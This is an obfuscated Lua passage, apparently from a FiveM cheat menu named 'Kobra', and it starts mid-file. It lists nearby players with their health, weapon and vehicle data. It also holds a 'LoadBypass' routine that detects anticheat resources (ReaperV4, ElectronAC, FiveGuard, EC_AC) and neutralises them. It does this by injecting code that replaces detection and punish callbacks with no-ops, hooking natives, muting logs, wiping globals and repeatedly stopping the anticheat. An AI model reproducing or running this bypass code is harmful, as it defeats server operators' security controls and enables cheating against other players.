,v1722.label),3000);if v13 then v12:UpdateElements(v17);end break;end end end break;end end end end end end);v12.InListMenu=function(v306) return v18 and v18[v19] and ((v18[v19].label=="List") or (v18[v19].label=="Safe")) ;end;v12.SelectEveryone=function(v307) local v308=1956 -(809 + 1147) ;local v309;while true do if (v308==(497 -(178 + 319))) then if ( not v18 or  not v18[v19]) then return;end v309=v18[v19];v308=1 -0 ;end if (v308==(2 + 0)) then v307:UpdateElements(v17);break;end if (v308==(1271 -(1255 + 15))) then if (v309.label~="List") then return;end for v705,v706 in ipairs(v309.tabs) do if (v706.type=="checkbox") then local v882=0;while true do if (v882==(1542 -(1221 + 321))) then v706.checked=true;if (v706.serverId and tonumber(v706.serverId)) then v27[tonumber(v706.serverId)]=true;end break;end end end end v308=2;end end end;v12.UnselectEveryone=function(v310) local v311=0 -0 ;local v312;while true do if (v311==(1 + 0)) then if (v312.label~="List") then return;end for v707,v708 in ipairs(v312.tabs) do if (v708.type=="checkbox") then local v883=0 -0 ;while true do if ((0 -0)==v883) then v708.checked=false;if (v708.serverId and tonumber(v708.serverId)) then v27[tonumber(v708.serverId)]=false;end break;end end end end v311=2;end if (v311==(1 + 1)) then v310:UpdateElements(v17);break;end if (v311==0) then if ( not v18 or  not v18[v19]) then return;end v312=v18[v19];v311=1;end end end;v12.ClearSelection=function(v313) local v314=0 + 0 ;while true do if (v314==(0 -0)) then v27={};if (v18 and v18[v19]) then local v839=0;local v840;while true do if (v839==(407 -(204 + 203))) then v840=v18[v19];if ((v840.label=="List") and v840.tabs) then for v1232,v1233 in ipairs(v840.tabs) do if (v1233.type=="checkbox") then v1233.checked=false;end end end break;end end end v314=1;end if (v314==(79 -(48 + 30))) then v12:UnselectEveryone();break;end end end;v12.UpdateListMenu=function(v315) if  not v13 then return;end if ( not v18 or  not v18[v19]) then return;end local v316=v18[v19];if (v316.label~="List") then return;end local v317=GetEntityCoords(PlayerPedId());if  not v317 then return;end local v318=v315:GetNearbyPlayers(v317,159 + 191 ,true);local v319;for v488,v489 in ipairs(v316.tabs) do if ((v489.type=="divider") and (v489.label=="Nearby Players")) then v319=v488;break;end end if  not v319 then return;end for v490= #v316.tabs,v319 + (1965 -(1472 + 492)) , -1 do table.remove(v316.tabs,v490);end if ( #v318==(0 -0)) then v316.tabs[ #v316.tabs + 1 + 0 ]={type="button",label="No Nearby Players",disabled=true};else table.sort(v318,function(v630,v631) return tonumber(v630.serverId)<tonumber(v631.serverId) ;end);for v632,v633 in ipairs(v318) do local v634=tonumber(v633.serverId);if (v634 and v633.name) then local v841,v842=GetCurrentPedWeapon(GetPlayerPed(GetPlayerFromServerId(v634)));v316.tabs[ #v316.tabs + 1 ]={type="checkbox",label=("%s - [%s]"):format(v633.name,v634),serverId=v634,checked=v27[v634] or false ,name=v633.name,vehicle=((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v634)))~=(611 -(258 + 353))) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v634)))) or nil ,isDriver=(GetPedInVehicleSeat((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v634)))~=(1994 -(1382 + 612))) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v634))) , -1)==GetPlayerPed(GetPlayerFromServerId(v634))) or false ,metaData={{key="Distance",value=math.floor( #(GetEntityCoords(PlayerPedId()) -GetEntityCoords(GetPlayerPed(GetPlayerFromServerId(v634)))))   .. ".0m" },{key="Server ID",value=v634},{key="Health",value=GetEntityHealth(GetPlayerPed(GetPlayerFromServerId(v634))),color="0, 255, 17"},{key="Armour",value=GetPedArmour(GetPlayerPed(GetPlayerFromServerId(v634))),color="0, 132, 255"},{key="Weapon",value=v28[v842] or "Unknown" },{key="Vehicle",value=((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v634)))~=(0 -0)) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v634)))) or "Unknown" },{key="Alive",value=(IsPedDeadOrDying(GetPlayerPed(GetPlayerFromServerId(v634))) and "Dead") or "Alive" },{key="Speed",value=math.floor(GetEntitySpeed(GetPlayerPed(GetPlayerFromServerId(v634))) * (218.6 -(75 + 140)) )   .. ".0 km/h" },{key="Visible",value=(IsEntityVisibleToScript(GetPlayerPed(GetPlayerFromServerId(v634))) and "Visible") or "Invisible" }},onSelect=function(v884) v27[v634]=v884 or false ;end};end end end for v491,v492 in pairs(v27) do local v493=0;local v494;while true do if (v493==(1800 -(923 + 876))) then if  not v494 then v27[v491]=nil;end break;end if (v493==0) then v494=false;for v844,v845 in ipairs(v318) do if (tonumber(v845.serverId)==tonumber(v491)) then v494=true;break;end end v493=2 -1 ;end end end v15=math.min(v15 or 1 ,math.max(813 -(284 + 528) , #v316.tabs));local v320,v321=pcall(function() v315:UpdateElements(v17);end);if  not v320 then print("^7[^5Kobra^7]: UI update error: "   .. tostring(v321) );end end;v12.AssignListMenuActions=function(v322) if  not v16 then return;end for v495,v496 in ipairs(v16) do if ((v496.label=="Server") and v496.categories) then for v709,v710 in ipairs(v496.categories) do if ((v710.label=="List") and v710.tabs) then for v953,v954 in ipairs(v710.tabs) do if (v954.type=="button") then if (v954.label=="Select Everyone") then v954.onSelect=function() v12:SelectEveryone();end;elseif (v954.label=="Un-Select Everyone") then v954.onSelect=function() v12:UnselectEveryone();end;elseif (v954.label=="Clear Selection") then v954.onSelect=function() v12:ClearSelection();end;end end end end end end end end;CreateThread(function() while true do local v497=1019 -(867 + 152) ;while true do if (v497==(1106 -(709 + 397))) then Wait(1500);if (v12:InListMenu() and v13) then local v887=0 -0 ;local v888;local v889;while true do if ((36 -(21 + 15))==v887) then v888,v889=pcall(function() v12:UpdateListMenu();end);if  not v888 then print("^7[^5Kobra^7]: List update error: "   .. tostring(v889) );end break;end end end break;end end end end);Wait(1000);v12:AssignListMenuActions();local v114=nil;local v115=nil;local function v116() local v323=0 -0 ;while true do if (v323==0) then for v711=0,GetNumResources() -(1 -0)  do local v712=0 + 0 ;local v713;local v714;while true do if (v712==1) then if (v714 and (string.find(v714,"https://electron-services.com") or string.find(v714,"Electron Services") or string.find(v714,"The most advanced fiveM anticheat"))) then local v1025=0 -0 ;while true do if (v1025==(0 -0)) then v114=v713;print("^7[^5Kobra^7]: Detected ElectronAC in Resource: "   .. v713 );v1025=1 + 0 ;end if (v1025==(136 -(97 + 38))) then return v713;end end end break;end if (v712==(80 -(52 + 28))) then v713=GetResourceByFindIndex(v711);v714=LoadResourceFile(v713,"fxmanifest.lua");v712=1;end end end return nil;end end end local function v117() local v324=0;while true do if (v324==0) then for v715=0,GetNumResources() -1  do local v716=GetResourceByFindIndex(v715);local v717=GetNumResourceMetadata(v716,"client_script");for v846=0 + 0 ,v717-(850 -(59 + 790))  do local v847=0 + 0 ;local v848;while true do if (v847==(0 + 0)) then v848=GetResourceMetadata(v716,"client_script",v846);if (v848 and string.find(v848,"obfuscated")) then local v1150=940 -(467 + 473) ;while true do if (v1150==(0 -0)) then v115=v716;print("^7[^5Kobra^7]: Detected FiveGuard in Resource: "   .. v716 );v1150=2 -1 ;end if (v1150==(2 -1)) then return v716;end end end break;end end end end return nil;end end end v12.LoadBypass=function(v325) local v326={"216.146.24.88:30120","91.190.154.74:30120"};local v327=GetCurrentServerEndpoint();for v498,v499 in ipairs(v326) do if (v327==v499) then v325:Notify("error","Kobra","Bypass disabled for this server.",1184 + 1816 );return;end end v325:Notify("info","Kobra","Loading Anticheat Bypass...",6618 -3618 );v116();v117();Wait(1000);if (GetResourceState("ReaperV4")=="started") then local v552=0;while true do if (v552==(0 -0)) then MachoInjectResource2(2,"ReaperV4",[[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local reaper_newdetection
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "Reaper:NewDetection" then
                        reaper_newdetection = func
                    end
                end
                if type(reaper_newdetection) ~= "function" then
                    return print("error")
                end
                local _, securityclient = debug.getupvalue(reaper_newdetection, 1)
                for name, detection in pairs(securityclient["detections"]) do
                    if detection["detected"] then
                        securityclient["detections"][name]["detected"] = function(...)
                            local args = { ... }
                            print(name, "detected", json.encode(args or {}))
                            return
                        end
                    end
                    if detection["callback"] then
                        securityclient["detections"][name]["callback"] = function(...)
                            local args = { ... }
                            print(name, "callback", json.encode(args or {}))
                            return
                        end
                    end
                end
                for name, detection in pairs(securityclient["active_detections"]) do
                    if detection["detected"] then
                        securityclient["active_detections"][name]["detected"] = function(...) return end
                    end
                    if detection["callback"] then
                        securityclient["active_detections"][name]["callback"] = function(...) return end
                    end
                end
                Debug.setupvalue(reaper_newdetection, 1, securityclient)
                print("ReaperV4 | Client Bypassed")
            end)
        ]]);MachoHookNative(14327026000000000000 -  -164677602 ,function(...) return false,false;end);v552=1;end if ((1 + 2)==v552) then print("ReaperV4 Bypass Enabled");v325:Notify("info","Kobra","ReaperV4 Bypass Loaded",560 + 2440 );break;end if (v552==(1 + 0)) then MachoHookNative(10181871000000000000 -(58 + 179) ,function(...) return false,7 -4 ;end);MachoHookNative(12777102000000000000,function(...) return false,true;end);v552=1255 -(677 + 576) ;end if ((1 + 1)==v552) then MachoHookNative(15349248000000000000 -0 ,function(...) return false,220 -(88 + 132) ;end);MachoHookNative(18127728000000000000 -(1212 + 319) ,function(...) return false,true;end);v552=3;end end elseif (v114~=nil) then local v718=0 -0 ;while true do if (v718==(0 -0)) then v48("ElectronAC",[[
            print = function() end
            local originalTrace = Citizen.Trace
            Citizen.Trace = function(msg)
                if not (string.find(msg, "DEBUG") or string.find(msg, "NEWDBG") or string.find(msg, "A11AXXX") or string.find(msg, "function") or string.find(msg, "TriggerServerEvent")) then
                    originalTrace(msg)
                end
            end
        ]]);MachoInjectResource2(1931 -(400 + 1529) ,"ElectronAC",[[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local eAcVerify
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "ElectronAC.verify" then
                        local upname, func = debug.getupvalue(func, 1)
                        eAcVerify = func
                    end
                end
                local EACTable = nil
                local eacUpvalueIndex = nil
                local i = 1
                while true do
                    local name, value = debug.getupvalue(eAcVerify, i)
                    if not name then break end
                    if type(value) == "table" then
                        local hasEACStructure = false
                        for idx, tbl in pairs(value) do
                            if type(tbl) == "string" then
                                if tbl == "antiNuiBlocker" or tbl == "antiInvisible" then
                                    hasEACStructure = true
                                end
                                if hasEACStructure then break end
                            end
                        end
                        if hasEACStructure then
                            EACTable = value
                            eacUpvalueIndex = i
                            break
                        end
                    end
                    i = i + 1
                end
                if not EACTable then
                    print("EAC table not found!")
                    return
                end
                local punish = function(...) return end
                for idx, tbl in pairs(EACTable) do
                    if type(tbl) == "table" then
                        for subIdx, subTbl in pairs(tbl) do
                            if type(subTbl) == "table" and type(subTbl["punish"]) == "function" and subTbl["punish"] then
                                subTbl["punish"] = punish
                            end
                        end
                    end
                end
                Debug.setupvalue(eAcVerify, eacUpvalueIndex, EACTable)
                print("ElectronAC | Client Bypassed")
            end)
        ]]);break;end end elseif (v115~=nil) then local v890=665 -(249 + 416) ;while true do if (v890==(0 -0)) then CreateThread(function() while true do local v1235=0 + 0 ;while true do if (v1235==1) then Wait(2000);break;end if (v1235==(0 + 0)) then MachoResourceStop(v115);print("^7[^5Kobra^7]: Stopped Resource: "   .. v115 );v1235=990 -(848 + 141) ;end end end end);return;end end elseif (GetResourceState("EC_AC")=="started") then local v994=0;local v995;while true do if (v994==(741 -(372 + 368))) then v995={"EC_AC"};for v1303=1131 -(542 + 588) , #v995 do local v1304=v995[v1303];MachoInjectResource(v1304,[[
                print(GetCurrentResourceName())
                for name, func in pairs(_G) do
                    if name == "TriggerEvent" then return end
                    _G[name] = nil
                    print(name, func)
                end
            ]]);Wait(1050);end v994=820 -(6 + 812) ;end if (v994==2) then CreateThread(function() while true do Wait(0);MachoResourceStop("EC_AC");end end);break;end if ((1705 -(1599 + 106))==v994) then MachoInjectResourceRaw("EC_AC",[[print = function() end]]);MachoInjectResourceRaw("EC_AC",[[
            local originalTrace = Citizen.Trace
            Citizen.Trace = function(msg)
                if not (
                    string.find(msg, "DEBUG") or
                    string.find(msg, "NEWDBG") or
                    string.find(msg, "A11AXXX") or
                    string.find(msg, "function") or
                    string.find(msg, "TriggerServerEvent")
                ) then
                    originalTrace(msg)
                end
            end
        ]]);v994=1;end end end if (GetResourceState("WaveShield")=="started") then v12:Notify("error","Kobra","WaveShield Anticheat Found.",8334 -5334 );elseif (GetResourceState("ReaperV4")=="started") then v12:Notify("error","Kobra","ReaperV4 Anticheat Found.",1444 + 1556 );elseif (GetResourceState("ElectronAC")=="started") then v12:Notify("error","Kobra","ElectronAC Anticheat Found.",1269 + 1731 );elseif (GetResourceState("FiniAC")=="started") then v12:Notify("error","Kobra","FiniAC Anticheat Found.",3000);end end;
